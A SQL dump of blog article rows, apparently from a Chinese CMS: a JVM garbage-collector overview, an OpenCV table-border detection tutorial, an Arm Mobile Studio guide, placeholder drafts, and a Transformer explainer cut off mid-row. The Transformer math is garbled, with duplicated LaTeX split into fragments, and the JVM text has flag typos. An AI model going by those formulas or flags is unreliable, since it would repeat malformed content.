INSERT INTO `article` VALUES (33, 'java虚拟机系列:垃圾收集器', 4, '概述', '<p>垃圾收集器是垃圾回收算法（标记-清除算法、复制算法、标记-整理算法）的具体实现，不同商家、不同版本的JVM所提供的垃圾收集器可能会有很在差别.</p>\n<p><br />图中展示了7种不同分代的收集器：</p>\n<p>Serial、ParNew、Parallel Scavenge、Serial Old、Parallel Old、CMS、G1；</p>\n<p>而它们所处区域，则表明其是属于新生代收集器还是老年代收集器：</p>\n<p>新生代收集器：Serial、ParNew、Parallel Scavenge；</p>\n<p>老年代收集器：Serial Old、Parallel Old、CMS；</p>\n<p>整堆收集器：G1；</p>\n<p>两个收集器间有连线，表明它们可以搭配使用：</p>\n<p>Serial/Serial Old、Serial/CMS、ParNew/Serial Old、ParNew/CMS、Parallel Scavenge/Serial Old、Parallel Scavenge/Parallel Old、G1；</p>\n<p>Serial收集器</p>\n<p>Serial收集器是单线程收集器，是分代收集器。它进行垃圾收集时，必须暂停其他所有的工作线程，直到它收集结束(Stop TheWorld)。</p>\n<p>新生代：单线程复制收集算法；<br />老年代：单线程标记整理算法。<br />Serial一般在单核的机器上使用，是Java 5非服务端JVM的默认收集器，参数-XX:UseSerialGC设置使用。<br />优势：对于单CPU环境来说，Serial收集器没有线程交互的开销，专心做垃圾收集可以获得最高的单线程收集。Serial收集器对于在Client模式下的虚拟机是一个很好的选择。</p>\n<p>ParNew收集器<br />ParNew/Serial Old组合收集器运行示意图如下：</p>\n<p><br />ParNew收集器其实就是Serial收集器的多线程版本。新生代并行，老年代串行；新生代复制算法、老年代标记-整理</p>\n<p>参数控制：<br />-XX:+UseConcMarkSweepGC\"：指定使用CMS后，会默认使用ParNew作为新生代收集器；<br />-XX:+UseParNewGC\"：强制指定使用ParNew；<br />-XX:ParallelGCThreads\"：指定垃圾收集的线程数量，ParNew默认开启的收集线程与CPU的数量相同；</p>\n<p>优势：ParNew收集器是许多运行在server模式下的虚拟机中首选的新生代收集器，一个重要的原因是，只有ParNew和Serial收集器能和CMS收集器共同工作。无法与JDK1.4中存在的新生代收集器Parallel Scavenge配合工作，所以在JDK1.5中使用CMS来收集老年代的时候，新生代只能选择ParNew和Serial。</p>\n<p>ParNew收集器在单CPU环境中不比Serial效果好，甚至可能更差，两个CPU也不一定跑的过，但随着CPU数量的增加，性能会逐步增加。默认开启的收集线程数与CPU数量相同。在CPU数量很多的情况下，可以使用-XX:ParallelGCThreads参数来限制线程数。</p>\n<p>Parallel Scavenge收集器<br />Parallel Scavenge收集器是一个新生代的手机器，使用的是复制算法的收集器，而且也是多线程的收集器。<br />Parallel Scavenge收集器，目标达到一个可控制的吞吐量，使用-XX:MaxGCPauseMillus参数控制垃圾停顿时间，使用-XX:GCTimeRatio参数控制吞吐量。Parallel Scavenge收集器设置-XX:UseAdaptiveSizePolicy参数，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大吞吐量（GC自使用的调节策略）。<br />自适应调节策略也是Parallel Scavenge收集器和ParNew收集器一个重要的区别。</p>\n<p>Serial Old收集器<br />Serial收集器的老年代版，它同样是一个单线程收集器，使用标记&ndash;整理算法。收集器的意义在于给Client模式下的虚拟机使用。如果在Server模式下，那么它主要有两大用途：一种是在jdk1.5以及之前的版本中与Parallel Scavenge收集器搭配使用，另一种用途是作为CMS收集器的后预案，在并发收集发生Concurrent Mode Failure时使用。工作流程图如下：</p>\n<p><br />Parallel Old 收集器<br />Parallel Scavenge收集器的老年代版，使用多线程与标记&ndash;整理算法。这个收集器在jdk1.6中才开始提供的，直到Parallel Old 收集器出现后，&ldquo;吞吐量优先&rdquo;收集器终于有了比较名副其实的应用组合，在注重吞吐量以及CPU资源敏感的场合，都可以优先考虑Parallel Scavenge加 Parallel Old收集器</p>\n<p><br />CMS收集器<br />一种以获取最短回收停顿时间为目标的收集器。目前很大一部分的java应用集中在互联网站或者B/S系统的服务端上，这类应用尤其重视服务的响应速度，希望系统停顿时间最短，以给用户带来较好的体验。CMS收集器就非常符合这类应用的需求。CMS收集器是基于&ldquo;标记-清除&rdquo;算法实现的，主要分为4个步骤。</p>\n<p>初始标记（CMS inital mark）：需要&ldquo;stop the world&rdquo;，但只标记一下GC Roots能直接关联的对象，速度很快。<br />并发标记（CMS concurrent mark）：是GC Roots Tracing的过程，花费时间长<br />重新标记（CMS remark）：*需要&ldquo;stop the world&rdquo;，是为了修正并发标记期间因用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段时间一般会比初始标记阶段稍长一些，但远比并发标记的时间短。<br />并发清除（CMS concurrent sweep）：是并发清除无用对象。<br />缺点：<br />CMS收集器对CPU资源非常敏感。在并发阶段，它虽然不会导致用户线程停顿，但是因为占用了一部分CPU资源而导致应用程序变慢，总吞吐量就会降低。CMS默认启动的回收线程数为(CPU数量+3)/4。当CPU的个数少于2个的时候，CMS对用户程序的影响可能会变得很大。<br />CMS收集器无法处理浮动垃圾（floating garbage），可能会出现concurrent mode failure导致另一次full gc的产生。在CMS的并发清理阶段，由于程序还在运行，垃圾还会不断产生，这一部分垃圾出现在标记过程之后，CMS无法在本次收集中处理掉它们，只好留到下一次GC再处理。这种垃圾称为浮动垃圾。同样由于CMS GC阶段用户线程还需要运行，即还需要预留足够的内存空间供用户线程使用，因此CMS收集器不能像其他收集器那样等到老年代几乎完全被灌满了再进行收集而需要预留一部分空间提供并发收集时的程序运作使用。默认设置下 CMS收集器在老年代使用了68%的空间后就会被激活。这个值可以用-XX:CMSInitiatingOccupancyFraction来设置。要是CMS运行期间预留的内存无法满足程序需要，就会出现concurrent mode failure，这时候就会启用Serial Old收集器作为备用进行老年代的垃圾收集。<br />空间碎片过多（标记-清除算法的弊端），CMS是基于标记-清除算法来实现的回收器，提供-XX:+UseCMSCompactAtFullCollection参数，应用于在FULL GC后再进行一个碎片整理过程。-XX:CMSFullGCsBeforeCompaction,多少次不压缩的full gc后来一次带压缩的。<br />G1收集器<br />G1收集器（Garbage-First）：是当今收集器技术发展的最前沿的成果之一，G1是一款面向服务器端应用的垃圾收集器。 使用G1收集器时，java堆的内存布局就与其他收集器有很大差别，它将真个java堆划分为多个大小相等的独立区域（Region），虽然还保留新生代与老年代的概念，但新生代与老年代不再试物理隔离的了，他们都是一部分Region（不需要连续）的集合。G1具备如下特点：</p>\n<p>并行与并发：G1能充分利用多CPU、多核环境下的硬件优势，使用多个CPU（CPU或者CPU核心）来缩短Stop-The-World停顿的时间，部分其他收集器原本需要停顿java线程执行的GC动作，G1收集器仍然可以通过并发的方式让java程序继续执行。<br />分代收集：与其他收集器一样，分代概念在G1中依然得以保留。虽然G1可以不需要其他收集器配合就能够独立管理整个GC堆，但它能够采用不同的方式去处理新创建的对象和已经存活了一段时间、熬过多次GC的旧对象以获取更好的收集效果。<br />空间整合：与CMS的&ldquo;标记&ndash;清理&rdquo;算法不同，G1从整体来看是基于&ldquo;标记&ndash;整理&rdquo;算法实现的收集器，从局部（两个Region之间）上来看是基于&ldquo;复制&rdquo;算法实现的，但无论如何，这两种算法都意味着G1运行期间不会产生内存空间碎片，收集后能提供规整的可用内存。这个特性有利于程序长时间运行，分配大对象时不会因为无法找到连续内存空间而提前出发下一次GC。<br />可预测的停顿：这是G1相对于CMS的另一大优势，降低停顿时间是G1和CMS共同的关注点，但G1除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不得超过N毫秒，这几乎已经是实时java（RTSJ）的垃圾收集器的特性了。<br />初始标记（Initial Marking）：标记GC Roots能够直接关联到的对象，并且修改TAMS的值，能在正确可用的Region中创建对象，这阶段需要停顿线程，而且耗时很短。<br />并发标记（Concurrent Marking）：从GC Roots开始堆中对象进行可达性分析，找出存活的对象，这个时间耗时比较长，但可与用户程序并行执行。<br />最终标记（Final Marking）：为了修正和正在并发标记期间因用户程序继续运行而导致标记产生变动的那一部分没有标记记录，虚拟机将这一段对象变法记录在线程Rememberred Set logs里面，最终标记阶段需要把Remembered Set logs 的数据合并到Remembered Set中，这阶段需要停顿线程，但是可并发执行。<br />筛选回收（Live Data Counting and Evacuation）：对各个Region的回收截止和成本进行排序，根据用户期望的GC停顿时间来制定回收计划，这阶段可以做到和用户程序一起并发执行，但是因为值回收一部分Region，时间是用户可控制的，而且停顿用户线程将大幅度提高手机效率。</p>\n<p>Minor GC和Full GC的区别<br />（A）、Minor GC<br />又称新生代GC，指发生在新生代的垃圾收集动作；<br />因为Java对象大多是朝生夕灭，所以Minor GC非常频繁，一般回收速度也比较快；<br />（B）、Full GC<br />又称Major GC或老年代GC，指发生在老年代的GC；<br />出现Full GC经常会伴随至少一次的Minor GC（不是绝对，Parallel Sacvenge收集器就可以选择设置Major GC策略）；<br />Major GC速度一般比Minor GC慢10倍以上；</p>\n<p>详解 JVM Garbage First(G1) 垃圾收集器<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「程序员ZZ的源码」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/u012998254/article/details/81635902</p>', '', 6, ',41,7,', '原创', '公开', '已发布', '', 1, '', '', 0, '2021-12-05 22:40:23', '2021-12-05 22:40:23');
INSERT INTO `article` VALUES (34, 'Python Opencv 图片识别表格：边框线检测', 10, '概述', '<p>图片识别表格的一个重要步骤是检测出图片中表格的边框线。</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/148/942/310/0080086000148942310.20211212114154.55326759825624834031311512063473:50521211102318:2800:EF2061170C26E655574322D45F465F743D6BF7E1E84B584BB2EA8A03994B2D87.jpg\" alt=\"108-%E8%B4%A8%E9%87%8F%E8%BE%83%E5%B7%AE%E7%9A%84%E8%A1%A8%E6%A0%BC%E6%A0%B7%E6%9C%AC2.JPG\" /></span></p>\n<p>边框线检测最大的挑战是笔画中出现的横线和竖线。你可能认为可以通过线条的长短来区分，但如果是一张密集的表格，某个边框线只出现在一个单元格里，它也会很短。因此这种思路也会有兼容性问题。</p>\n<p>网上有很多关于线段检测的算法，但是都只是在某种特定情况下是可行的，当我们要识别各种图片中的各种表格时，不得不考虑一种更健壮更全面的算法。</p>\n<p>整体思路如下：</p>\n<p>- 通过image_binary变为二值图像</p>\n<p>- 确保图像为白底黑字，因为稍后的操作都是膨胀白色</p>\n<p>- 通过dilate膨胀白色横块抹去文字和竖线。因为文字的笔画之间是有白色间隙的，通过白色横块膨胀，文字会被大部分抹去，除了极少的横线笔画。膨胀结果取反变成黑底白线得到A</p>\n<p>- 通过dilate膨胀白色竖块抹去文字和横线。因为文字的笔画之间是有白色间隙的，通过白色竖块膨胀，文字会被大部分抹去，除了极少的竖线笔画。膨胀结果取反变成黑底白线得到B</p>\n<p>- AB结果通过bitwise_or合并得到边框检测结果</p>\n<p>&nbsp;</p>\n<pre><br /><code class=\"language-python hljs \"><span class=\"hljs-comment\">#转换为灰度图</span>\ngray = cv2.cvtColor(image, cv2.COLOR_RGB2GRAY)\n\n<span class=\"hljs-comment\">#转为二值图</span>\nret, binary = cv2.threshold(gray, black_thr, <span class=\"hljs-number\">255</span>, cv2.THRESH_BINARY)\n\n<span class=\"hljs-comment\"># 膨胀算法的色块大小</span>\nh, w = binary.shape\nhors_k = int(math.sqrt(w)*<span class=\"hljs-number\">1.2</span>)\nvert_k = int(math.sqrt(h)*<span class=\"hljs-number\">1.2</span>)\n\n<span class=\"hljs-comment\"># 白底黑字，膨胀白色横向色块，抹去文字和竖线，保留横线</span>\nkernel = cv2.getStructuringElement(cv2.MORPH_RECT, (hors_k,<span class=\"hljs-number\">1</span>))\nhors = ~cv2.dilate(binary, kernel, iterations = <span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\"># 迭代两次，尽量抹去文本横线，变反为黑底白线</span>\n\n<span class=\"hljs-comment\"># 白底黑字，膨胀白色竖向色块，抹去文字和横线，保留竖线</span>\nkernel = cv2.getStructuringElement(cv2.MORPH_RECT, (<span class=\"hljs-number\">1</span>,vert_k))\nverts = ~cv2.dilate(binary, kernel, iterations = <span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\"># 迭代两次，尽量抹去文本竖线，变反为黑底白线</span>\n\n<span class=\"hljs-comment\"># 横线竖线检测结果合并</span>\nborders = cv2.bitwise_or(hors,verts)\n\n\n\n</code><button>复制</button></pre>\n<p>该算法最讲究的就是dilate的kernel的大小，太大了会误删边框线，太小了会留下很多干扰线。网上看到的算法大部分是按照图片宽高进行一个比列的缩放，实际效果并不好。这里采用了图片宽高的平方根的办法，更好的解决了图片分辨率和线条之间的关系。</p>\n<p>需要注意的是都是对dilate的结果取反得到黑底白线，便于后面通过bitwise_or叠加得到borders</p>\n<p>&nbsp;</p>\n<p>实际效果如下：</p>\n<p>黑白二值：</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/148/942/310/0080086000148942310.20211212120918.70063073335134703605628366293228:50521211102318:2800:C69C6B20276C3575F36BB755866487214C73FCB3D1272F268555ADFDF8DA94F9.png\" alt=\"image.png\" /></span></p>\n<p>横线检测：</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/148/942/310/0080086000148942310.20211212120957.16812535991569651346716075801148:50521211102318:2800:A1C8EC1FEB69FB80CCDA54E6C27DE525A7984C2EF2D6597A6C022666175AE422.png\" alt=\"image.png\" /></span></p>\n<p>竖线检测：</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/148/942/310/0080086000148942310.20211212121042.34620216109668851963440417455896:50521211102318:2800:1DBD7F2CC9403D3994D1AF0A243E83747A6AA779C91CC8F320CD2D99A9C059E7.png\" alt=\"image.png\" /></span></p>\n<p>边框合并</p>\n<p><span class=\"easyimage easyimage-full\"><img class=\"previewableImage\" src=\"https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/148/942/310/0080086000148942310.20211212121136.77310010212132946339437654594488:50521211102318:2800:D510070EA39B012F4B66563DD13C0141F972A73AC01F27DD9CC07B58F5E7A687.png\" alt=\"image.png\" /></span></p>\n<p>&nbsp;</p>\n<p>可以看到算法结束后，仍然存在一些干扰点，因此还需要进一步的算法进行过滤，将在后续文章中讲解。</p>', '', 7, ',5,', '原创', '公开', '已发布', '', 0, 'Hot', '', 0, '2021-12-12 18:24:30', '2021-12-12 18:24:30');
INSERT INTO `article` VALUES (35, 'Arm Mobile Studio_2021.0 安装及组件的使用', 10, '概述', '<p style=\"font-weight: 400;\"><strong>本文档基于Arm Mobile Studio_2021.0版本编写，如有任何问题，请以ARM mobile studio官方指导文档为准。</strong></p>\n<p style=\"font-weight: 400;\">ARM mobile studio&nbsp;组件<strong>Graphics Analyzer</strong>官方指导文档：</p>\n<p style=\"font-weight: 400;\">https://developer.arm.com/documentation/102469/0100/Configure-your-device</p>\n<p style=\"font-weight: 400;\">&nbsp;</p>\n<p style=\"font-weight: 400;\">ARM mobile studio&nbsp;组件<strong>Streamline</strong>官方指导文档：</p>\n<p style=\"font-weight: 400;\">https://developer.arm.com/tools-and-software/graphics-and-gaming/arm-mobile-studio/learn/get-started/get-started-with-streamline</p>\n<p style=\"font-weight: 400;\">&nbsp;</p>\n<p style=\"font-weight: 400;\">ARM mobile studio最新版本下载链接：</p>\n<p style=\"font-weight: 400;\">https://developer.arm.com/tools-and-software/graphics-and-gaming/arm-mobile-studio/downloads</p>\n<p style=\"font-weight: 400;\">&nbsp;</p>\n<p style=\"font-weight: 400;\">Arm Mobile Studio_2020.0请参考:&nbsp;<a href=\"https://developer.huawei.com/consumer/cn/forum/topic/0202336807101250292?fid=0103325401414330531\">https://developer.huawei.com/consumer/cn/forum/topic/0202336807101250292?fid=0103325401414330531</a>&nbsp;</p>\n<p style=\"font-weight: 400;\">&nbsp;</p>\n<p style=\"font-weight: 400;\"><strong>简介：</strong></p>\n<p style=\"font-weight: 400;\">Arm Mobile Studio&nbsp;包含了aga(Arm Graphics Analyzer)与Streamline两个工具。Aga主要是方便应用开发者查看huawei手机的 GPU每帧的opengles或vulkan调用行为，Streamline主要方便查看huawei手机的GPU相关counter数据信息。以wins为例，文主要介绍组件Streamline和Graphics Analyzer的配置及使用。</p>\n<h1>安装配置</h1>\n<ol>\n<li style=\"font-weight: 400;\">以默认方式安装Arm Mobile Studio执行文件</li>\n</ol>\n<p style=\"font-weight: 400;\">Arm Mobile Studio下载地址: https://developer.arm.com/tools-and-software/graphics-and-gaming/arm-mobile-studio/downloads</p>\n<ol start=\"2\">\n<li style=\"font-weight: 400;\">安装ADB, 并添加路径到环境变量path或者也可以直接在工具菜单中配置ADB路径，如下图所示</li>\n</ol>\n<h1>手机配置</h1>\n<ol>\n<li>打开手机开发者选项及USB调式</li>\n<li>使用USB数据线将手机连接在电脑上，确保命令行执行adb devices能输出手机ID及能成功执行adb shell</li>\n<li>安装要抓取数据的调试版本（debug版本）的游戏</li>\n</ol>\n<h1>使用Streamline连接设备</h1>\n<ol>\n<li>使用数据线连接你需要调试的手机</li>\n<li>启动 Streamline</li>\n<li>在Start标签页面选择你要调试的设备，选择<strong>Android（adb）</strong>，从设备列表里选择设备。<strong>Configure Application</strong>列表里会显示选择设备的应用。从列表里选择你想要抓取的debug应用。</li>\n</ol>\n<h1>选择一个Counter模板</h1>\n<ol>\n<li>点击<strong>Start Capture</strong>开始抓取之前先点击<strong>figure Counters</strong>按钮来选择一个模板。</li>\n<li><strong>counter configuration</strong>面板窗口，点击增加模板选项来选择可用的模板。如下图所示：</li>\n<li>选择手机GPU对应的计数器模板。手机支持的计数器的数量显示在每个模板旁边。比如，在Mali Bifrost架构模板中，总共86个GPU计数器中有77个是支持的。</li>\n</ol>\n<p>注：有关每个Mali GPU的所有可用计数器的详细说明，参考链接：</p>\n<p>https://developer.arm.com/ip-products/graphics-and-multimedia/mali-gpus/mali-performance-counters</p>\n<ol start=\"4\">\n<li>单击save按钮保存</li>\n<li>当然，你也可以点击Advanced Settings来设置额外的抓取项，包括采样率和抓取时长。</li>\n</ol>\n<h1>抓取GPU Counter数据</h1>\n<ol>\n<li>点击<strong>Start Capture</strong></li>\n<li>指定抓取完成时Streamline将创建的抓取文件的名称和位置。</li>\n<li>应用程序将在设备上启动，Streamline中的图表将实时更新，以显示正在抓取的数据。图表下面是应用程序中正在运行的进程及其CPU使用率。</li>\n<li>除非你在<strong>Advanced Settings</strong>里设置了抓取时长，否则你需要手动点击<strong>Stop Capture</strong>按钮来结束抓取。抓取的文件保存在先前指定的位置，然后开始分析抓取的数据，一旦完成，抓取的数据会显示在<strong>Timeline</strong>视图。</li>\n<li>点击模板管理按钮，选择你抓取前选择的同一个计数器配置模板。</li>\n<li>数据抓取完，就可以对抓取到的counter进行详细分析。</li>\n</ol>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><strong>组件Graphics Analyzer的使用</strong></p>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\n<h1>使用组件Graphics Analyzer抓取一帧</h1>\n<ol>\n<li>启动Graphics Analyzer</li>\n</ol>\n<p>&nbsp;</p>\n<ol start=\"2\">\n<li>从调试中选择打开设备管理界面</li>\n</ol>\n<p>1）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从安卓设备列表中选择需要连接的设备</p>\n<p>2）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;选择调试的应用（debug版本）</p>\n<p>3）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;点击右下角<strong>Start Capture</strong>开始抓取</p>\n<p>&nbsp;</p>\n<ol start=\"3\">\n<li>你可以通过点击<strong>Trace Config</strong>来选择需要监视的API接口，勾选你需要抓取的选项。你勾选的选项越多，应用就会运行的越慢，这就意味着会消耗更大的内存，并且监视文件也会变得更大。</li>\n</ol>\n<p>&nbsp;</p>\n<ol start=\"4\">\n<li>在设备上执行测试场景。Graphics Analyzer显示从设备上抓取的数据</li>\n<li>当执行到有问题的地方时，你可以使用&ldquo;暂停&rdquo;、&ldquo;单步执行&rdquo;和&ldquo;播放&rdquo;按钮来定位要详细分析的单帧文件。</li>\n<li>通过点击相机图标以捕获当前帧的帧缓冲区输出。当然，你也可以先通过启用以下模式，然后点击相机图标来捕获额外的帧数据。</li>\n</ol>\n<p>&nbsp;</p>\n<ol>\n<li>a)Overdraw</li>\n<li>b)Shader map</li>\n<li>c)Fragment count</li>\n<li>点击断开连接按钮停止跟踪。所有的帧都显示在<strong>Trace Outline</strong>窗口。</li>\n</ol>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1>分析一帧数据</h1>\n<p>&nbsp;</p>\n<ol start=\"8\">\n<li>你可以使用Graphics Analyzer中的各种数据视图来分析监视数据。所有帧数据都列在大纲视图中。捕获额外数据的帧将显示一个图标，以标识执行的帧捕获类型。</li>\n</ol>\n<p>&nbsp;</p>\n<ol>\n<li>a)你可以通过用<strong>Show Only Frames With Features Enabled</strong>选项来筛选那些你捕获额外数据的帧。</li>\n<li>b)通过展开帧缓冲来看这一帧里面包含了哪些renderpass和drawcall。</li>\n</ol>\n<p>&nbsp;</p>\n<ol>\n<li>c)数据抓完后就可以选择抓取文件对应的frames、renderpasses和draw call来浏览它们的详细数据。</li>\n</ol>', '', 2, ',42,', '原创', '公开', '已发布', '', 0, '', '', 0, '2021-12-18 19:37:51', '2021-12-18 19:37:51');
INSERT INTO `article` VALUES (36, '-', 2, '概述', '<p>-</p>', '', 2, ',1,', '原创', '公开', '草稿', '', 0, '', '', 0, '2021-12-19 22:43:18', '2021-12-19 22:43:18');
INSERT INTO `article` VALUES (37, '--', 1, '概述', '-', '', 2, ',6,', '原创', '公开', '待审核', '', 0, '', '', 0, '2021-12-19 22:47:43', '2021-12-19 22:47:43');
INSERT INTO `article` VALUES (38, '---', 1, '概述', '-', '', 2, ',6,', '分享', '公开', '待审核', '', 2, '', '', 0, '2021-12-19 22:52:53', '2021-12-19 22:52:53');
INSERT INTO `article` VALUES (39, '+', 1, '概述', '+', '', 7, ',34,', '翻译', '公开', '待审核', '', 1, '', '', 0, '2021-12-19 22:53:24', '2021-12-19 22:53:24');
INSERT INTO `article` VALUES (40, '/*-', 1, '概述', '<p><img src=\"http://127.0.0.1:8080/upload/image/article/2021/12/20/3ab628a0-6733-478a-87a9-6c98c1f2f9c6.png\" alt=\"\" width=\"920\" height=\"518\" /></p>', '', 5, ',9,', '翻译', '公开', '待审核', '', 0, '', '', 0, '2021-12-20 22:36:39', '2021-12-20 22:36:39');
INSERT INTO `article` VALUES (42, 'Transformer详解（附代码）', 1, '概述', '<p>引言</p>\n<p>&emsp;T r a n s f o r m e r \\mathrm{Transformer}Transformer模型是G o o g l e \\mathrm{Google}Google团队在2017 20172017年6 66月由A s h i s h&nbsp; &nbsp;V a s w a n i \\mathrm{Ashish\\text{ }Vaswani}Ashish Vaswani等人在论文《A t t e n t i o n&nbsp; &nbsp;I s&nbsp; &nbsp;A l l&nbsp; &nbsp;Y o u&nbsp; &nbsp;N e e d \\mathrm{Attention\\text{ }Is\\text{ }All \\text{ }You \\text{ } Need}Attention Is All You Need》所提出，当前它已经成为N L P \\mathrm{NLP}NLP领域中的首选模型。T r a n s f o r m e r \\mathrm{Transformer}Transformer抛弃了R N N \\mathrm{RNN}RNN的顺序结构，采用了S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention机制，使得模型可以并行化训练，而且能够充分利用训练资料的全局信息，加入T r a n s f o r m e r \\mathrm{Transformer}Transformer的S e q 2 s e q \\mathrm{Seq2seq}Seq2seq模型在N L P \\mathrm{NLP}NLP的各个任务上都有了显著的提升。本文做了大量的图示目的是能够更加清晰地讲解T r a n s f o r m e r \\mathrm{Transformer}Transformer的运行原理，以及相关组件的操作细节，文末还有完整可运行的代码示例。</p>\n<p>&nbsp;</p>\n<p>注意力机制</p>\n<p>&emsp;T r a n s f o r m e r \\mathrm{Transformer}Transformer中的核心机制就是S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention。S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention机制的本质来自于人类视觉注意力机制。当人视觉在感知东西时候往往会更加关注某个场景中显著性的物体，为了合理利用有限的视觉信息处理资源，人需要选择视觉区域中的特定部分，然后集中关注它。注意力机制主要目的就是对输入进行注意力权重的分配，即决定需要关注输入的哪部分，并对其分配有限的信息处理资源给重要的部分。</p>\n<p>&nbsp;</p>\n<p>Self-Attention</p>\n<p>&nbsp;</p>\n<p>&emsp;S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention工作原理如上图所示，给定输入w o r d&nbsp; &nbsp;e m b e d d i n g \\mathrm{word\\text{ }embedding}word embedding向量a 1 , a 2 , a 3 &isin; R d l &times; 1 a^1,a^2,a^3 \\in \\mathbb{R}^{d_l \\times 1}a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;,a&nbsp;</p>\n<p>2</p>\n<p>&nbsp;,a&nbsp;</p>\n<p>3</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，然后对于输入向量a i , i &isin; { 1 , 2 , 3 } a^i,i\\in \\{1,2,3\\}a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i&isin;{1,2,3}通过矩阵W q &isin; R d k &times; d l , W k &isin; R d k &times; d l , W v &isin; R d l &times; d l W^q\\in \\mathbb{R}^{d_k \\times d_l},W^k\\in \\mathbb{R}^{d_k \\times d_l},W^v\\in \\mathbb{R}^{d_l\\times d_l}W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;,W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;,W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;进行线性变换得到Q u e r y \\mathrm{Query}Query向量q i &isin; R d k &times; 1 q^i\\in\\mathbb{R}^{d_k \\times 1}q&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，K e y \\mathrm{Key}Key向量k i &isin; R d k &times; 1 k^i\\in \\mathbb{R}^{d_k \\times 1}k&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>k</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，以及V a l u e \\mathrm{Value}Value向量v i &isin; R d l &times; 1 v^i\\in \\mathbb{R}^{d_l \\times 1}v&nbsp;</p>\n<p>i</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，即</p>\n<p>{ q i = W q &sdot; a i k i = W k &sdot; a i , i &isin; { 1 , 2 , 3 } v i = W v &sdot; a i \\left\\{</p>\n<p>qikivi=Wq&sdot;ai=Wk&sdot;ai,i&isin;{1,2,3}=Wv&sdot;ai</p>\n<p>qi=Wq&sdot;aiki=Wk&sdot;ai,i&isin;{1,2,3}vi=Wv&sdot;ai</p>\n<p>\\right.</p>\n<p>⎩</p>\n<p>⎪</p>\n<p>⎨</p>\n<p>⎪</p>\n<p>⎧</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>q&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>k&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>v&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=W&nbsp;</p>\n<p>q</p>\n<p>&nbsp;&sdot;a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>=W&nbsp;</p>\n<p>k</p>\n<p>&nbsp;&sdot;a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i&isin;{1,2,3}</p>\n<p>=W&nbsp;</p>\n<p>v</p>\n<p>&nbsp;&sdot;a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>如果令矩阵A = ( a 1 , a 2 , a 3 ) &isin; R d l &times; 3 A=(a^1,a^2,a^3)\\in\\mathbb{R}^{d_l \\times 